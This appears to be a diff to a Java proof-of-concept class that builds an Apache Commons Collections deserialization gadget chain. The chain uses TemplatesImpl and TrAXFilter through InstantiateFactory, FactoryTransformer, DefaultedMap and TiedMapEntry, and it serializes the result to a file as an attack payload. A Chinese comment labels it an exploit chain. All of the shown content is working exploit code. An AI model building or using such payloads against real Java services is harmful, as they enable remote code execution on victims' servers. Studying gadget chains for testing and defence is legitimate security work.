@@ -271,8 +271,6 @@ public class CommonsCollections4New2 {
         _tfactory.set(templates,new TransformerFactoryImpl());
         // 利用链
         InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
-
-
         FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);
 
 
@@ -282,13 +280,12 @@ public class CommonsCollections4New2 {
         Constructor constructor = cls.getDeclaredConstructor(Map.class, Transformer.class);
         constructor.setAccessible(true);
         Map defaultedMap = (DefaultedMap)constructor.newInstance(innerMap, factoryTransformer);
-        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap,templates);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap,"keyTest");
         Map expMap = new HashMap<>();
         expMap.put(tiedMapEntry,"valueTest");
 
-
-        FileOutputStream fileOutputStream = new FileOutputStream("1.txt");
         // 创建并实例化对象输出流
+        FileOutputStream fileOutputStream = new FileOutputStream("1.txt");
         ObjectOutputStream out = new ObjectOutputStream(fileOutputStream);
         out.writeObject(expMap);
     }
